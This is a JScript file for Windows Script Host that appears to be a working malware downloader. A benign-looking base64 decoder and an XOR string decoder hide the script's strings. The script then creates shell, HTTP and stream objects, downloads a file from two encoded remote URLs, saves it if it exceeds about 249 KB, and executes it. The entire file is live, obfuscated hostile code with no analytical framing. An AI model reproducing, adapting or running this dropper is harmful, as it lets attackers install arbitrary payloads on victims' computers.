var _base64Idx = [
    /*43 -43 = 0*/
    /*'+',  1,  2,  3,'/' */
    62, -1, -1, -1, 63,

    /*'0','1','2','3','4','5','6','7','8','9' */
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61,

    /*15, 16, 17,'=', 19, 20, 21 */
    -1, -1, -1, 64, -1, -1, -1,

    /*65 - 43 = 22*/
    /*'A','B','C','D','E','F','G','H','I','J','K','L','M', */
    0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12,

    /*'N','O','P','Q','R','S','T','U','V','W','X','Y','Z' */
    13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,

    /*91 - 43 = 48 */
    /*48, 49, 50, 51, 52, 53 */
    -1, -1, -1, -1, -1, -1,

    /*97 - 43 = 54*/
    /*'a','b','c','d','e','f','g','h','i','j','k','l','m' */
    26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38,

    /*'n','o','p','q','r','s','t','u','v','w','x','y','z' */
    39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51
];

function decode(input, output, offset) {
    var out = output;
    if(!out) {
        out = new Uint8Array(Math.ceil(input.length / 4) * 3);
    }

    // remove all non-base64 characters
    input = input.replace(/[^A-Za-z0-9\+\/\=]/g, '');

    offset = offset || 0;
    var enc1, enc2, enc3, enc4;
    var i = 0, j = offset;

    while(i < input.length) {
        enc1 = _base64Idx[input.charCodeAt(i++) - 43];
        enc2 = _base64Idx[input.charCodeAt(i++) - 43];
        enc3 = _base64Idx[input.charCodeAt(i++) - 43];
        enc4 = _base64Idx[input.charCodeAt(i++) - 43];

        out[j++] = (enc1 << 2) | (enc2 >> 4);
        if(enc3 !== 64) {
            // decoded at least 2 bytes
            out[j++] = ((enc2 & 15) << 4) | (enc3 >> 2);
            if(enc4 !== 64) {
                // decoded 3 bytes
                out[j++] = ((enc3 & 3) << 6) | enc4;
            }
        }
    }

    // make sure result is the exact decoded length
    return output ?
        (j - offset) :
        out.subarray(0, j);
}

var wHn8G8guSv = function (packedText) {

    var buffer = [];
    var length = decode(packedText, buffer);
    var charCodeAt = "charCodeAt";
    var result = "";
    for (var i = 0; i < length; i++) {
        result += String.fromCharCode(buffer[i] ^ "pQkOgklyW47GeSSa"[charCodeAt](i % "pQkOgklyW47GeSSa".length));
    }
    return result;
};
var forsakegYu = function() {
    var renegadeosS = function() {};
    renegadeosS.prototype.create = function(enduringqLq) {
        return WScript.CreateObject(enduringqLq);
    };
    return renegadeosS;
}();

(function() {
    var devolveQyi = new forsakegYu();
    var alacrityygF = 200;
    var perishl6i = wHn8G8guSv('"NxQ/"');
    var seemlyyUU = wHn8G8guSv('"NSkOLA=="');
    var quaffTMH = wHn8G8guSv('"JwIIPQ4bGFcEXFIrCQ=="');
    var docileaPT = wHn8G8guSv('"PQIzAitZQiEaeH8TMQM="');
    var undertakewF6 = wHn8G8guSv('"MzAOCyU9JQsfAg=="');
    var mercurialuys = wHn8G8guSv('"CjxYKAhbHD8DBw=="');
    var cogentEMp = wHn8G8guSv('"MRUkCyU="');
    var haleMAD = wHn8G8guSv('"IyUZKgYG"');
    var admonishD7Y = wHn8G8guSv('"VQUuAjdOMA=="');
    var conspicuousXaE = wHn8G8guSv('"XjQTKg=="');
    var subsideak2 = Math.pow(2, 10) * 249;
    var exorbitantEyH = [ wHn8G8guSv('"GCUfP11EQxEyWFsoHDwmDxc8CiEWGkIaOFkYf1V9NhkV"'), wHn8G8guSv('"GCUfP11EQxEyWFsoHDwmDxc8CiEBDUIaOFkYf1V9NhkV"') ];
    var viscidmnX = 2097152;
    var satireRXR = devolveQyi.create(quaffTMH);
    var spatehSK = devolveQyi.create(docileaPT);
    var wizenedtE9 = devolveQyi.create(cogentEMp + wHn8G8guSv('"Xg=="') + haleMAD);
    var conspicuousyxS = satireRXR.ExpandEnvironmentStrings(admonishD7Y);
    var livelihoodDnS = conspicuousyxS + viscidmnX + conspicuousXaE;
    var imbibeRWX = false;
    for (var mendicantmpH = 0; mendicantmpH < exorbitantEyH.length; mendicantmpH++) {
        try {
            var dwellrDI = exorbitantEyH[mendicantmpH];
            spatehSK.open(perishl6i, dwellrDI, false);
            spatehSK.send();
            if (spatehSK.status == alacrityygF) {
                try {
                    wizenedtE9.open();
                    wizenedtE9.type = 1;
                    wizenedtE9.write(spatehSK[wHn8G8guSv('"AjQYPwgFHxwVW1M+"')]);
                    if (wizenedtE9.size > subsideak2) {
                        mendicantmpH = exorbitantEyH.length;
                        wizenedtE9.position = 0;
                        wizenedtE9.saveToFile(livelihoodDnS, 2);
                        imbibeRWX = true;
                    }
                } finally {
                    wizenedtE9.close();
                }
            }
        } catch (ignored) {}
    }
    if (imbibeRWX) {
        satireRXR[seemlyyUU](conspicuousyxS + Math.pow(2, 21));
    }
})();